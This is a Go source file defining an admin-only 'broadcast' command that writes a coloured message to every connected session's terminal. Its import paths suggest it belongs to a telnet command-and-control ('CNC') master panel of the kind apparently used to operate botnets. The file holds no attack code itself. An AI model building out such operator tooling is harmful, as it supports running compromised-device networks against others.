package admin

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"strings"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"broadcast"},
		Description: "Broadcast an message",
		Admin:       true,
		Usage:       []command.Argument{{"message", false}},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if len(args) < 1 {
				return command.ErrNotEnoughArguments
			}

			mf := strings.Join(args, " ")
			for _, s := range sessions.Clone() {
				s.Term.Write([]byte("\x1b[101;97m BROADCAST \u001B[0m " + mf + "\r\n"))
			}
			return nil
		},
	})
}
